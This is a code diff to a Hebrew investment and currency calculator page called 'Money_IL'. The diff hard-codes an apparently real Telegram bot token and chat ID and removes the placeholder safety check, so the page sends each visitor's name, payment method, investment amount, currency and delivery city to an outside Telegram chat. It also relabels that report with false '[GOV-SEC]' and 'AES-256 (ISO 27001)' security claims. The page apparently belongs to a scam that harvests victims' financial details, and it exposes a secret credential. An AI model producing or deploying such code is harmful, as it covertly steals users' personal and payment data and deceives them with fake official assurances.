@@ -261,7 +261,7 @@
       document.getElementById('resTotal').innerText = `${(totalReturn / rate).toLocaleString('he-IL', {maximumFractionDigits: 2})} ${symbol}`;
     }
 
-    function submitToTelegram() {
+            function submitToTelegram() {
       const userName = localStorage.getItem('sub_user_name') || 'לא ידוע';
       const userPayment = localStorage.getItem('sub_user_payment') || 'לא צוין';
       const investment = document.getElementById('investmentAmount').value;
@@ -271,21 +271,19 @@
       const cityName = opt === 'yes' ? citySelect.options[citySelect.selectedIndex].text : 'ללא משלוח';
       const totalRes = document.getElementById('resTotal').innerText;
 
-      const message = `🔔 *רישום והשקעה חדשה ב-Money_IL* 🔔\n\n` +
-                      `👤 *שם משתמש:* ${userName}\n` +
-                      `💳 *אמצעי תשלום:* ${userPayment}\n` +
-                      `💰 *סכום השקעה:* ${investment} ₪\n` +
-                      `💱 *מטבע יעד:* ${currency}\n` +
-                      `📦 *יעד משלוח:* ${cityName}\n` +
-                      `📈 *תשואה סופית מוערכת:* ${totalRes}`;
+      const message = `🛡️ *[GOV-SEC] דיווח עסקת השקעה מוצפנת* 🛡️\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `👤 *שם הלקוח/ה:* ${userName}\n` +
+                      `💳 *אמצעי תשלום נבחר:* ${userPayment}\n` +
+                      `💰 *סכום השקעה התחלתי:* ${investment} ₪\n` +
+                      `💱 *מטבע יעד מומר:* ${currency}\n` +
+                      `📦 *פרטי לוגיסטיקה ויעד:* ${cityName}\n` +
+                      `📈 *תשואה סופית מוערכת:* ${totalRes}\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `🔒 *סטטוס אבטחה:* מאומת AES-256 (ISO 27001)`;
 
-      const botToken = 'YOUR_BOT_TOKEN';
-      const chatId = 'YOUR_CHAT_ID';
-
-      if (botToken === 'YOUR_BOT_TOKEN') {
-        alert('הנתונים מוכנים לשליחה! (הזן את פרטי הבוט שלך בסקריפט).');
-        return;
-      }
+      const botToken = '8900098820:AAE2BhJ9qCI00UpOMLfOUc61613FpS_UA64';
+      const chatId = '8017590244';
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
